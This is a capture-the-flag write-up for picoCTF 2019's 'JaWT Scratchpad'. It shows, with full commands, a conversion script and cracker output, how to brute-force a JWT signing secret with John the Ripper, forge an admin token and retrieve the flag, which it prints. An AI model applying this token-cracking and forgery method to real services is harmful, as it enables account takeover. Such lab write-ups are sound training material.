# JaWT Scratchpad
Web Exploitation, 400 points

## Description:
> Check the admin scratchpad!


## Solution: 

Let's connect to the provided website:

```console
root@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# curl https://2019shell1.picoctf.com/problem/37903/
<!doctype html>
<html>
        <title> JaWT - an online scratchpad </title>
        <link rel="stylesheet" href="/static/css/stylesheet.css">
        <body>
                <header><h1>JaWT</h1> <br> <i><small>powered by <a href="https://jwt.io/">JWT</a></small></i></header>
                <div id="main">
                        <article>
                                <h1>Welcome to JaWT!</h1>

                                <p>
                                        JaWT is an online scratchpad, where you can "jot" down whatever you'd like! Consider it a notebook for your thoughts. <b style="color:blue "> JaWT works best in Google Chrome for some reason. </b>
                                </p>

                                <p>
                                        You will need to log in to access the JaWT scratchpad. You can use any name, other than <code>admin</code>... because the <code>admin</code> user gets a special scratchpad!
                                </p>
                                <br>
                                <form action="#" method="POST">
                                        <input type="text" name="user" id="name">
                                </form>
                                <br>

                                <h2> Register with your name! </h2>
                                <p>
                                        You can use your name as a log in, because that's quick and easy to remember! If you don't like your name, use a short and cool one like <a href="https://github.com/magnumripper/JohnTheRipper">John</a>!
                                </p>
                        </article>
                        <nav></nav>
                        <aside></aside>
                </div>
                <script> window.onload = function() { document.getElementById("name").focus(); }; </script>
        </body>
</html>
```

If we try to login as `admin`, we get an error:
```console
root@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# curl "https://2019shell1.picoctf.com/problem/37903/"  -H "Content-Type: application/x-www-form-urlencoded"  --data "user=admin"
...
    <p style="color:red">
            YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT.
    </p>
...
```

However, logging in as another user is allowed:
```console
root@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# curl "https://2019shell1.picoctf.com/problem/37903/"  -H "Content-Type: application/x-www-form-urlencoded"  --data "user=john" -v
*   Trying 3.15.247.173...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x558ed4e47d10)
* Connected to 2019shell1.picoctf.com (3.15.247.173) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: none
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: OU=Domain Control Validated; OU=PositiveSSL Wildcard; CN=*.picoctf.com
*  start date: Oct 26 00:00:00 2018 GMT
*  expire date: Nov  1 23:59:59 2020 GMT
*  subjectAltName: host "2019shell1.picoctf.com" matched cert's "*.picoctf.com"
*  issuer: C=GB; ST=Greater Manchester; L=Salford; O=COMODO CA Limited; CN=COMODO RSA Domain Validation Secure Server CA
*  SSL certificate verify ok.
> POST /problem/37903/ HTTP/1.1
> Host: 2019shell1.picoctf.com
> User-Agent: curl/7.64.0
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 9
>
* upload completely sent off: 9 out of 9 bytes
< HTTP/1.1 302 FOUND
< Server: nginx
< Date: Sun, 13 Oct 2019 11:28:56 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 209
< Connection: keep-alive
< Location: https://2019shell1.picoctf.com/
< Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y; Path=/
< Strict-Transport-Security: max-age=0
<
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
* Connection #0 to host 2019shell1.picoctf.com left intact
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.
```

Notice the cookie we receive upon a successful login:
```
< Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y; Path=/
```

"JWT" stands for "[JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token)":

> JSON Web Token (JWT) is an Internet standard for creating JSON-based access tokens that assert some number of claims. For example, a server could generate a token that has the claim "logged in as admin" and provide that to a client. The client could then use that token to prove that it is logged in as admin. The tokens are signed by one party's private key (usually the server's), so that both parties (the other already being, by some suitable and trustworthy means, in possession of the corresponding public key) are able to verify that the token is legitimate.

We can decode the token using an [online tool](https://jwt.io/) or via the CyberChef API:
```
root@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# export NODE_PATH=$(npm root --quiet -g)
root@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# node
> const chef = require("cyberchef");
undefined
> chef.JWTDecode("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y");
{
    "user": "john"
}
>
```

We can change the user to "admin", but we'll need to sign the token and we don't have the key. That's where "JohnTheRipper" (referenced in the website itself) comes in.

[This post](https://security.stackexchange.com/questions/134200/cracking-a-jwt-signature) explains how to brute force JWT using JohnTheRipper.

First, we need to convert the token to a format that JohnTheRipper can understand, using the following script:

```python
# https://security.stackexchange.com/questions/134200/cracking-a-jwt-signature
# https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py
import sys
from jwt.utils import base64url_decode
from binascii import hexlify


def jwt2john(jwt):
    """
    Convert signature from base64 to hex, and separate it from the data by a #
    so that John can parse it.
    """
    jwt_bytes = jwt.encode('ascii')
    parts = jwt_bytes.split(b'.')

    data = parts[0] + b'.' + parts[1]
    signature = hexlify(base64url_decode(parts[2]))

    return (data + b'#' + signature).decode('ascii')


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: %s JWT" % sys.argv[0])
    else:
        john = jwt2john(sys.argv[1])
        print(john)
```

Running it:
```console
root@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9ob
iJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y > jwt.john
root@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# cat jwt.john
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9#fdf005dc7db77243f842d1753e8ddea6e656c666f0a48f10dba8513c34e1df66
```

Now we run `john` to try and locate the key (we'll use a dictionary attack):

```console
root@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# ~/utils/john/run/john jwt.john  --wordlist=/root/utils/dictionaries/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Warning: OpenMP is disabled; a non-OpenMP build may be faster
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:05 DONE (2019-10-13 14:44) 0.1996g/s 1476Kp/s 1476Kc/s 1476KC/s ilovepinkxxx..ilovepatopollo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We modify the user to "admin" and resign with the key (`ilovepico`):

```
> jwt = { "user": "admin" };
{ user: 'admin' }
> chef.JWTSign(jwt, ["ilovepico", "HS256"]);
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1NzA5Njg2NDB9.77pnOGlEdwL7MtxHHS6ZKYD5z1O8w_-SFnzPGyNo9t8
```

We resend the request to the website and receive the flag:

```console
root@kali:/media/sf_CTFs/pico/JaWT_Scratchpad# curl "https://2019shell1.picoctf.com/problem/37903/#"  -H "Content-Type: application/x-www-form-urlencoded"  --data "user=admin" -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1NzA5Njg2NDB9.77pnOGlEdwL7MtxHHS6ZKYD5z1O8w_-SFnzPGyNo9t8" -s | grep pico
                                        <textarea style="margin: 0 auto; display: block;">picoCTF{jawt_was_just_what_you_thought_9ed4519dee8140de7a186a5df5a08d6e}</textarea>
```

